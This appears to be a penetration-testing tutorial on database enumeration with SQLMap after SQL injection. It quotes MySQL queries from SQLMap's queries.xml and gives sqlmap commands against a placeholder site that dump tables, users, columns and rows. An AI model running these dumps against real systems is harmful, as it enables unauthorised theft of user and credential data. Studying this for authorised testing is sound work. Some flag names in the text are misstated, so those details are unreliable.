# Database Enumeration
***
#### Enumeration is a critical phase in an SQl injection attack, taking place after the vulnerability has been detected and confirmed to be exploitable. During this stage, the attacker systematically searches for and extracts as much information as possible from the compromised database. This process onvolves identifying and retrieving all accessible data, leveraging the discovered weakness in the database.
### SQLMap Data Exfiltration
#### SQLMap comes equipped with a predefined set of queries tailored to various Database Management Systems (DBMSes). Each of these queries is designed to run specific SQL commands against a targeted database, facilitating the extraction of valuable information. These queries are carefully crafted to retrieve the desired data from the compromised system. For instance, in the case of a MySQL database, SQLMap utilizes specific SQL commands outlined in its queries.xml file to extract relevant content. Below is an example of such entries for a MySQL DBMS:
```xml
<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
        </users>
    ...SNIP...
```
#### For Example, if we want to retrieve the hostname by using the `--hostname` option for a MySQL DBMS, the @@HOSTNAME query will be used for such purposes.

### Basic Database Data Enumeration
#### Useful flags to retrieve basic information:
* Database version banner (switch --banner)
* Current user name (switch --current-user)
* Current database name (switch --current-db)
* Checking if the current user has DBA (administrator) rights (switch `--is-dba`).
#### Example:
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --banner --current-user --current-db --is-dba
```
#### **Note**: The 'root' user in a database is usually distinct from the OS user "root." The database 'root' has full privileges within the DBMS but does not imply similar OS-level permissions. Modern setups typically restrict the database user's OS privileges (e.g., limiting file system access). The same principle applies to the generic 'DBA' role.


### Table Enumeration
#### After finding the current database name , we would try to retrieve the tables name by using the `--tables` flag and specifying the DB name with -D admindb
#### Example:
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --tables -D admindb
```

#### Then we can try to exfiltrate data from a table by using the `--dump` option and specifying the table name with -T users
#### Example:
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --dump -T users -D admindb
```
#### **NOTE**: In addition to the default CSV format, SQLMap allows us to specify different output formats using the --dump-format option. We can choose formats like HTML or SQLite. Opting for HTML provides a more readable view of the data in a web browser, while selecting SQLite enables us to import the data into an SQLite database for deeper analysis and investigation.

### Table/Row Enumeration
#### We can also specify the columns from a table using the `-C` flag
#### Example:
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --dump -T users -D admindb -C name,surname
```
#### Also we can narrow down the words based on their ordinal number(s) inside the table, by using the `--start` and `--top` flags
#### Example to start from 2nd up to 3rd entry:
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --dump -T users -D admindb --start=2 --stop=3
```

### Conditional Enumeration
#### In SQLMap we can use the option `--where` to retrieve certain rows based on a known **WHERE** condition
#### Example:
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --dump -T users -D admin --where="name LIKE 'r%'"
```

### Full DB Enumeration
#### Alternatively we can just retrieve all tables inside the database by using the `--dump` option. Or if we want to retrieve all the content from all the databases we can simply use the `--dump-all` flag. In combination with the --dump-all flag we can use the `-exclude-sysdbs` option to skip the retrieval of content from system databases.
